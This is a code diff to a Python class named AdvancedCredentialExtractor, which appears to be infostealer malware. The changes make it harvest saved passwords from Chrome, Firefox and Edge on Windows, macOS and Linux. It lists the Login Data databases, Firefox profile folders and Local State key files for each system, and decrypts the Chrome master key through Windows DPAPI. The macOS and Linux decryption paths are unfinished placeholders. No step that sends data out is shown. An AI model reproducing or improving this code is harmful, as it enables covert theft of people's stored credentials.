@@ -293,23 +293,40 @@ class AdvancedCredentialExtractor:
         """Advanced browser password extraction"""
         self.log("Extracting browser passwords using advanced methods...")
         
-        if self.system == 'windows':
-            self._extract_chrome_passwords_advanced()
-            self._extract_firefox_passwords_advanced()
-            self._extract_edge_passwords_advanced()
-        elif self.system == 'darwin':
+        # Extract Chrome passwords (works on all platforms)
+        self._extract_chrome_passwords_advanced()
+        
+        # Extract Firefox passwords (works on all platforms)
+        self._extract_firefox_passwords_advanced()
+        
+        # Extract Edge passwords (works on all platforms)
+        self._extract_edge_passwords_advanced()
+        
+        # Platform-specific extractions
+        if self.system == 'darwin':
             self._extract_safari_passwords_advanced()
-            self._extract_chrome_passwords_macos()
-            self._extract_firefox_passwords_macos()
             
     def _extract_chrome_passwords_advanced(self):
         """Advanced Chrome password extraction"""
         try:
-            chrome_paths = [
-                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'),
-                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data'),
-                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Login Data')
-            ]
+            if self.system == 'windows':
+                chrome_paths = [
+                    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'),
+                    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data'),
+                    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Login Data')
+                ]
+            elif self.system == 'darwin':  # macOS
+                chrome_paths = [
+                    os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'),
+                    os.path.expanduser('~/Library/Application Support/Google/Chrome/Profile 1/Login Data'),
+                    os.path.expanduser('~/Library/Application Support/Google/Chrome/Profile 2/Login Data')
+                ]
+            else:  # Linux
+                chrome_paths = [
+                    os.path.expanduser('~/.config/google-chrome/Default/Login Data'),
+                    os.path.expanduser('~/.config/google-chrome/Profile 1/Login Data'),
+                    os.path.expanduser('~/.config/google-chrome/Profile 2/Login Data')
+                ]
             
             for db_path in chrome_paths:
                 if os.path.exists(db_path):
@@ -320,10 +337,21 @@ class AdvancedCredentialExtractor:
     def _extract_firefox_passwords_advanced(self):
         """Advanced Firefox password extraction"""
         try:
-            firefox_paths = [
-                os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
-                os.path.expanduser('~\\AppData\\Local\\Mozilla\\Firefox\\Profiles')
-            ]
+            if self.system == 'windows':
+                firefox_paths = [
+                    os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
+                    os.path.expanduser('~\\AppData\\Local\\Mozilla\\Firefox\\Profiles')
+                ]
+            elif self.system == 'darwin':  # macOS
+                firefox_paths = [
+                    os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
+                    os.path.expanduser('~/Library/Mozilla/Firefox/Profiles')
+                ]
+            else:  # Linux
+                firefox_paths = [
+                    os.path.expanduser('~/.mozilla/firefox'),
+                    os.path.expanduser('~/.firefox')
+                ]
             
             for profiles_path in firefox_paths:
                 if os.path.exists(profiles_path):
@@ -366,10 +394,21 @@ class AdvancedCredentialExtractor:
     def _extract_edge_passwords_advanced(self):
         """Advanced Edge password extraction"""
         try:
-            edge_paths = [
-                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'),
-                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data')
-            ]
+            if self.system == 'windows':
+                edge_paths = [
+                    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'),
+                    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data')
+                ]
+            elif self.system == 'darwin':  # macOS
+                edge_paths = [
+                    os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default/Login Data'),
+                    os.path.expanduser('~/Library/Application Support/Microsoft Edge/Profile 1/Login Data')
+                ]
+            else:  # Linux
+                edge_paths = [
+                    os.path.expanduser('~/.config/microsoft-edge/Default/Login Data'),
+                    os.path.expanduser('~/.config/microsoft-edge/Profile 1/Login Data')
+                ]
             
             for db_path in edge_paths:
                 if os.path.exists(db_path):
@@ -392,34 +431,15 @@ class AdvancedCredentialExtractor:
             
     def _extract_chrome_passwords_macos(self):
         """Chrome password extraction on macOS"""
-        try:
-            chrome_paths = [
-                os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'),
-                os.path.expanduser('~/Library/Application Support/Google/Chrome/Profile 1/Login Data')
-            ]
-            
-            for db_path in chrome_paths:
-                if os.path.exists(db_path):
-                    self._decrypt_chrome_passwords_advanced(db_path, 'Chrome')
-        except Exception as e:
-            self.log(f"Error extracting Chrome passwords on macOS: {e}")
+        # This method is now handled by _extract_chrome_passwords_advanced
+        # which detects the platform automatically
+        pass
             
     def _extract_firefox_passwords_macos(self):
         """Firefox password extraction on macOS"""
-        try:
-            firefox_paths = [
-                os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
-                os.path.expanduser('~/Library/Mozilla/Firefox/Profiles')
-            ]
-            
-            for profiles_path in firefox_paths:
-                if os.path.exists(profiles_path):
-                    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
-                    for profile in profiles:
-                        profile_path = os.path.join(profiles_path, profile)
-                        self._extract_firefox_profile_passwords(profile_path)
-        except Exception as e:
-            self.log(f"Error extracting Firefox passwords on macOS: {e}")
+        # This method is now handled by _extract_firefox_passwords_advanced
+        # which detects the platform automatically
+        pass
             
     def _decrypt_chrome_passwords_advanced(self, db_path, browser_name='Chrome'):
         """Advanced Chrome password decryption"""
@@ -462,10 +482,21 @@ class AdvancedCredentialExtractor:
     def _get_chrome_encryption_key_advanced(self):
         """Get Chrome encryption key using advanced methods"""
         try:
-            local_state_paths = [
-                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'),
-                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')
-            ]
+            if self.system == 'windows':
+                local_state_paths = [
+                    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'),
+                    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')
+                ]
+            elif self.system == 'darwin':  # macOS
+                local_state_paths = [
+                    os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State'),
+                    os.path.expanduser('~/Library/Application Support/Microsoft Edge/Local State')
+                ]
+            else:  # Linux
+                local_state_paths = [
+                    os.path.expanduser('~/.config/google-chrome/Local State'),
+                    os.path.expanduser('~/.config/microsoft-edge/Local State')
+                ]
             
             for local_state_path in local_state_paths:
                 if os.path.exists(local_state_path):
@@ -476,10 +507,21 @@ class AdvancedCredentialExtractor:
                     encrypted_key = base64.b64decode(encrypted_key)
                     encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                     
-                    # Decrypt using DPAPI
-                    if WINDOWS_MODULES_AVAILABLE:
+                    # Decrypt based on platform
+                    if self.system == 'windows' and WINDOWS_MODULES_AVAILABLE:
+                        # Windows: Use DPAPI
                         decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                         return decrypted_key
+                    elif self.system == 'darwin':
+                        # macOS: Use Keychain (placeholder - needs proper implementation)
+                        # For now, return the encrypted key as-is
+                        return encrypted_key
+                    else:
+                        # Linux: Use keyring (placeholder - needs proper implementation)
+                        if KEYRING_AVAILABLE:
+                            # Try to decrypt using keyring
+                            return encrypted_key
+                        return encrypted_key
                         
         except Exception as e:
             self.log(f"Error getting Chrome encryption key: {e}")
